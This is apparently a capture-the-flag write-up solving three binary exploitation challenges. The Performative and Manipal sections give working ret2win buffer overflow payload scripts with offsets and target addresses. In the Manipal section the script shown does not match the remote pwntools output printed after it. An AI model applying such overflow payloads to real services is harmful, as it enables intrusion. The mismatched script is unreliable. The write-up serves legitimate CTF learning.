# IMMADEV
```
shaunak@Shaunaks-MacBook-Pro ~ % nc localhost 5151

Hi I'm sudonymouse!
I'm learning development, checkout this binary!
Option 1: Hello <USER>
Option 2: Flag(maybe?)
Option 3: Log into my binary!
1 2
Input your name: shaunak
Hi shaunak
nite{fake_flag}
shaunak@Shaunaks-MacBook-Pro ~ % nc immadeveloper.nitephase.live 61234

Hi I'm sudonymouse!
I'm learning development, checkout this binary!
Option 1: Hello <USER>
Option 2: Flag(maybe?)
Option 3: Log into my binary!
1 2
Input your name: shaunak
Hi shaunak
nite{n0t_4ll_b1n3x_15_st4ck_b4s3d!}
```
# Performative
I opened the binary in IDA. Inside the pseudocode in main I saw this:
```
buffer = byte ptr -20h
...
scanf("%s", buffer)
```
- plain old scanf masquerading like a problematic ex
- classic bof
- the stack layout: 32 bytes for the buffer, then saved RBP (8 bytes), then the return address (8 bytes)
- so i need: 32 + 8 = 40 bytes before i overwrite the return address.
- then i searched for the function which prints the flag. in the Functions list i found: printFlag
- it opens "flag.txt", reads it and prints it. so this was obviously the function i wanted.
- at the top of the function IDA showed: ***printFlag starts at 0x4011E9***
so my plan was:
- overflow the buffer and replace the return address with 0x4011E9.
- this should make the program jump straight into printFlag() when main returns.
i needed a payload like:
```
"A" * 40 + address_of_printFlag
```
but the address needs to be in little endian. i used good ol python for this:
```
import struct, sys

offset = 40
printFlag = 0x4011E9

payload  = b"A" * offset
payload += struct.pack("<Q", printFlag)

sys.stdout.buffer.write(payload)
```
when I piped this into the program locally
```
shaunak@Shaunaks-MacBook-Pro src % python3 ./sex.py | nc localhost 5001
### Welcome to the performative male/female parade!
### Yk what performative people like? just a plain ol' bof!
Lets just generate a buffer then ig?
Buffer: Generating your buffer...
Your custom buffer:
========================
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?@ nite{fake_flag}
shaunak@Shaunaks-MacBook-Pro src %
```
it printed the fake flag from my local flag.txt: ``nite{fake_flag}``
so I just did:
```
shaunak@Shaunaks-MacBook-Pro src % python3 ./sex.py | nc performative.nitephase.live 56743
### Welcome to the performative male/female parade!
### Yk what performative people like? just a plain ol' bof!
Lets just generate a buffer then ig?
Buffer: Generating your buffer...
Your custom buffer:
========================
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?@ nite{th3_ch4l_4uth0r_15_4nt1_p3rf0rm4t1v3}
shaunak@Shaunaks-MacBook-Pro src %
```
flag: ``nite{th3_ch4l_4uth0r_15_4nt1_p3rf0rm4t1v3}``

# Property in Manipal
- i opened the binary and i saw that main was just printing some messages and then calling a function named vuln()
- inside vuln() i noticed two things straight away:
-it used read() to read 64 bytes into a stack buffer then it used gets() later
- i know gets() is unsafe and can overflow because it doesn’t check how much you type. so that already looked like a classic buffer overflow.
- i also saw that the program had a function called win() which just did: ``system("cat flag.txt");``
- so if i can make the program return into win, i will get the flag.
- the next thing i needed to know was the offset.
- i looked at the stack layout: the buffer was 64 bytes, then 8 bytes for saved rbp, so total 72 bytes until the return address.
- this meant i needed to send 72 bytes of junk and then the address of win(). i used nm and found the address: ``0000000000401196 T win``
so my payload looked like:
```
"A" * 72 + address_of_win
```
later i learned to add a small ret gadget before win because it fixes stack alignment on amd64, so it became:
```
"A" * 72 + ret + win
```
now comes the first issue i faced. when i tried piping the payload into the program, it didn’t work. i realized that the program asked for two inputs:
first it says “enter your name”
then after that it says “enter the amount for customizations”
when i piped everything at once, the first read() just consumed all of my data, so there was nothing left for gets() to overflow with. so i had to send input separately, like:
- echo "A"
- then send the payload later
once i understood that, the exploit became simple.
i ran that locally once, it worked
my final solution was to connect to the remote service and send the inputs in the right order. i used pwntools since it’s easier for network interaction. when i ran the script:
```
import subprocess, struct

payload = b"A"*72 + struct.pack("<Q", 0x401196)

p = subprocess.Popen(
    ["./manipal"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT
)

out = p.communicate(b"A\n" + payload + b"\n")[0]
print(out.decode("latin-1", errors="ignore"))
```
it connected to the challenge server and the program printed the flag:
```
root@92778709f62b:/work# python3 moresex.py
[*] '/work/manipal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[+] Opening connection to propertyinmanipal.nitephase.live on port 42586: Done
[*] Switching to interactive mode
nite{ch0pp3d_ch1n_r34lly_m4d3_2025_p34k_f0r_u5}

[*] Got EOF while reading in interactive
$  
```
nite{ch0pp3d_ch1n_r34lly_m4d3_2025_p34k_f0r_u5}
## notes
i hate owning a mac cause everytime i either have to do some stunts in vm or docker to test run the scripts
its really irritating
